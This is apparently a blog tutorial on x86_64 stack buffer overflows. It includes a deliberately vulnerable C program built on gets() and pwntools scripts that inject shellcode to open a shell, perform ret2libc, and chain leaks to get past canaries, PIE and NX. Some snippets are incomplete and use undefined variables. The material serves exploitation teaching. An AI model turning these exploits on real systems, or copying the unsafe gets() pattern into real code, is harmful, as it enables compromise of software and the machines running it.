# Buffer Overflows — From the Stack to Shell

> 📅 Portfolio date: **June 22, 2024**

---

## The Stack at Rest

Before we exploit anything, we need to understand the terrain. When a C function is called on x86_64 Linux, the stack frame looks like this at the moment of the call instruction:

```
High addresses
──────────────────────────────────
         [function arguments]
         [return address]      ← RSP points here after CALL
         [saved RBP]           ← pushed by `push rbp`
         [local variables]     ← compiler-allocated space
──────────────────────────────────
Low addresses
```

The **return address** is the critical target. It's stored between the saved base pointer and the caller's stack frame. If we can overwrite it, we control where the CPU goes next.

**Key registers at exploitation:**

| Register | Role at RET |
|----------|-------------|
| RSP | Points to the return address on the stack |
| RBP | Points to the saved frame pointer (if `push rbp` was used) |
| RIP | Will be loaded from [RSP] during RET |
| RDI, RSI, RDX | First three function arguments (useful for one-gadgets) |

---

## The Vulnerable Binary

Here's what we're exploiting — a deliberately simple stack-based overflow:

```c
#include <stdio.h>
#include <string.h>

void vuln() {
    char buf[64];
    printf("Buffer at: %p\n", buf);
    gets(buf);  // ← no bounds checking
    printf("You said: %s\n", buf);
}

int main() {
    vuln();
    return 0;
}
```

Compile with protections disabled for a clear demonstration:

```bash
gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c
```

| Flag | What it disables |
|------|-----------------|
| `-fno-stack-protector` | No stack canaries |
| `-z execstack` | Stack is executable (NX disabled) |
| `-no-pie` | Fixed binary addresses (ASLR on the binary only) |

Real-world binaries have these protections enabled, but understanding the fundamentals on a clean target is the prerequisite to bypassing protections.

---

## Finding the Offset

Step one: how many bytes before we hit the return address?

Using pwntools' pattern:

```python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200, n=8)  # 200 bytes, 8-byte words

# Run with gdb
p = process('./vuln')
p.sendline(pattern)
p.wait()

# Core dump tells us RIP = 0x6361616c6361616b
# Pattern offset
offset = cyclic_find(b'kaaclkaa', n=8)
print(f"Offset to RIP: {offset}")  # 72
```

Offset 72. 72 bytes of padding before the return address.

---

## Stack Layout at Overflow

Just before the `ret` instruction in `vuln`, with our 72+8 bytes:

```
Address         Content
───────         ───────
0x7fffffffe000  [buf[0..63]]               ← 64 bytes
0x7fffffffe040  [saved RBP (8 bytes)]      ← overwritten with 'AAAAAAAA'
0x7fffffffe048  [return address (8 bytes)] ← overwritten with our target
0x7fffffffe050  [caller's stack frame]
```

The saved RBP doesn't matter for exploitation — it's only used by the caller's frame unwinding. The return address is what fires on `ret`.

---

## Shellcode + Return Address

Since we compiled with `-z execstack`, we can inject shellcode directly into the buffer and jump to it.

```python
from pwn import *

# 64-bit execve("/bin/sh", NULL, NULL) shellcode
shellcode = asm(shellcraft.sh(), arch='amd64')
# 27 bytes for sh shellcode

padding = b'A' * (72 - len(shellcode))
ebp = b'B' * 8  # saved RBP, doesn't matter

# Return to the buffer address (leaked by the binary itself)
ret_addr = p64(0x7fffffffe000)  # buf address from the leak

payload = shellcode + padding + ebp + ret_addr

p = process('./vuln')
p.recvuntil(b'Buffer at: ')
buf_addr = int(p.recvline().strip(), 16)

# Recalculate with actual leaked address
ret_addr = p64(buf_addr)
payload = shellcode + padding + ebp + ret_addr

p.sendline(payload)
p.interactive()  # shell!
```

**The leak is everything.** Without the `printf("Buffer at: %p\n", buf)` address leak, we'd have to guess the stack address, which ASLR makes impractical.

---

## Bypassing Protections

### NX (Non-Executable Stack)

When NX is enabled, shellcode on the stack won't execute. The solution: **return-to-libc** or **ROP**.

### Ret2Libc

```python
from pwn import *

# Find libc addresses (requires libc leak)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_off = libc.symbols['system']
bin_sh_off = next(libc.search(b'/bin/sh'))

# Leak libc base via GOT (requires the binary to print or crash)
libc_base = leak - libc.symbols['puts']  # or whatever function we leaked

payload = b'A' * 72
payload += p64(ROP_RET_GADGET)        # stack alignment
payload += p64(libc_base + system_off)
payload += p64(libc_base + bin_sh_off)  # passed to system in RDI (x86_64 calling convention)

# On 32-bit: no stack alignment needed, parameters on stack directly
```

The x86_64 calling convention requires the stack to be 16-byte aligned when `call` is executed. A lone `ret` gadget (`0x0000000000000c0f` or similar) pops nothing and realigns.

### Stack Canaries

Canaries sit between local variables and saved RBP. If overwritten, the program calls `__stack_chk_fail`.

```
[buf] [canary] [saved RBP] [ret addr]
```

Bypass strategies:

1. **Leak the canary** — format string vulnerability to read the canary value before overflow
2. **Brute-force** — on fork-based servers, the canary is per-process; 256 attempts per byte (x86_64 = 7 real bytes + null terminator)
3. **Overwrite before canary** — if the struct/array overwrite doesn't cross the canary

### PIE (Position Independent Executable)

With PIE, code addresses are randomised:

```bash
gcc -fno-stack-protector -no-pie ...  # no PIE → fixed addresses
gcc -fno-stack-protector -pie ...     # PIE → randomised
```

Bypass: **info leak**. Same as NX — you need a way to read a code pointer, calculate the base, then compute gadget addresses.

---

## Full Exploit: NX + PIE + Canary

```python
from pwn import *

context.arch = 'amd64'

# Stage 1: Leak canary + PIE base (requires format string vulnerability)
def leak_canary():
    p = process('./vuln_pie')
    # fmt string payload: read stack values
    p.sendline(b'%13$p.%15$p')  # canary at offset 13, PIE at 15
    leaks = p.recvline().strip().split(b'.')
    canary = int(leaks[0], 16)
    pie_leak = int(leaks[1], 16)
    pie_base = pie_leak - 0x12ab  # offset of leaked address in binary
    return canary, pie_base

# Stage 2: Build ROP chain with leaked addresses
canary, pie_base = leak_canary()
rop = ROP(ELF('./vuln_pie'))
rop.call('puts', [elf.got['puts']])  # leak libc
rop.call('main')                      # return to main for stage 3

payload = b'A' * 64
payload += p64(canary)       # restore canary
payload += b'B' * 8          # saved RBP
payload += rop.chain()       # return address → ROP chain

# Stage 3: Ret2Libc (after libc leak from stage 2)
# ... build system("/bin/sh") chain
```

---

## Summary Attack Flow

```
┌──────────┐     ┌──────────┐     ┌──────────┐
│ Find     │ ──→ │ Leak     │ ──→ │ Build    │
│ offset   │     │ addr    │     │ payload  │
└──────────┘     └──────────┘     └──────────┘
                                        │
                                        ▼
                               ┌──────────────────┐
                               │ Execute payload  │
                               │ shell / read flag│
                               └──────────────────┘
```

| Technique | Requirements | Bypasses |
|-----------|-------------|----------|
| Direct shellcode | Exec stack + known addr | Nothing — vanilla |
| Ret2Libc | Libc leak + known offsets | NX |
| ROP | Binary gadgets + PIE leak | NX + PIE |
| Full chain | Canary + PIE + libc leaks | NX + PIE + Canary |

**The single most important skill in binary exploitation is reading.** Reading the disassembly, reading the register state at crash, reading the memory layout. Every protection falls to an info leak, and every info leak starts with understanding exactly where you are in memory.

---
*Originally published on [saranx.hashnode.dev/buffer-overflow](https://saranx.hashnode.dev/buffer-overflow) on **July 24, 2026***
